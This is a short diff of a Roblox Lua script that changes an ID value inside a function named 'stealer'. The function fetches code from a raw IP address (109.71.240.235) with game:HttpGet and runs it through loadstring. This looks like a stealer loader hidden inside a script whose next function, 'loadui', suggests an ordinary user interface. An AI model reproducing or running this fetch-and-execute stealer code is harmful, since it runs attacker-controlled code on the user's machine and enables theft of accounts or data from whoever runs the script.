@@ -1,5 +1,5 @@
 local function stealer()
-    ID="488ddbfe-1c46-4e5e-8bfa-ab926272fff0";
+    ID="d2c98a9e-e95d-4583-be60-62a8dedc0c0b";
     loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 end
 local function loadui()
